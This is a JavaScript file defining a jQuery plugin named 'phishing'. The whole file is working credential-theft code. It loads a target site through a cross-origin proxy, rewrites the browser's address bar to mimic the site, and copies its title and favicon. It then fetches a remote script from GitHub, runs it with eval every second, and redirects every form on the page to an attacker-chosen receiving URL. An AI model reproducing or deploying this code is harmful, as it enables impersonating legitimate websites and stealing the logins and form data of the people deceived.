(function(){
  $ = jQuery || angular.element;
  $.phishing = function(url,receive_url,onload){
    if(typeof receive_url === 'function'){
      onload = receive_url;
      receive_url = void(0);
    }
    var get_link = (url=>{
      var link = document.createElement('a');
      link.href = url;
      return link;
    });
    $.get(`https://crossorigin.me/${get_link(url).href}`,data=>{
      var target = get_link(url);
      history.replaceState('','',`${location.protocol}//${location.host}${target.pathname}${target.search}${target.hash}`);
      data = data.replace(/<head.*>/i,`
        <head>
          <base href="${target.protocol}//${target.host}/">
      `);
      if(document.write.toString().indexOf('[native code]')==-1){
        var doc = document.implementation.createHTMLDocument();
        document.write = doc.write;
        document.open = doc.open;
        document.close = doc.close;
      }
      document.open();
      document.write(data);
      document.close();
      if(/<title/i.test(data)){
        document.title = data.match(/<title>(.*)<\/title>/i)[1];
      }else{
        document.title = location.hostname;
      }
      if(document.head){
        $('head').append(`<link rel="shortcut icon" href="${target.protocol}//${target.host}/favicon.ico">`);
      }
      if(receive_url){
        $.get('https://raw.githubusercontent.com/jackmasa/jQuery.xform/master/jquery.xssform.js',data=>{
          setInterval(()=>{
            eval(data);
            $('form').each((i,f)=>{
              if(get_link(f.action).hostname!=get_link(receive_url).hostname){
                $(f).xform(receive_url);
              }
            });
          },1000);
          onload && setTimeout(onload,233);
        });
      }else{
        onload && setTimeout(onload,233);
      }
    });
  };
})();
